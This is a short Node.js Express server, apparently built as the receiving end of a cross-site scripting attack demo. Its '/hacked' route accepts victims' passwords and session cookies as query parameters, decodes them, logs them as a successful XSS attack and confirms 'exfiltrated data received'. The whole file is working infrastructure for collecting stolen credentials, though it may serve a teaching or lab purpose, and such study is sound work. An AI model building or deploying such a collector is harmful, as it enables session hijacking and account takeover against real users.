const express = require('express');
const app = express();
const port = 3000;

// Serve static files from the `public` directory
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.get('/hacked', (req, res) => {
  const { password, session } = req.query;

  const decodedSession = decodeURIComponent(session);

  console.log(Date.now() + 'XSS Attack successful', password, decodedSession)

  res.json({
    message: `${Date.now()} Exfiltrated data received`,
    password,
    session: decodedSession,
  });
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
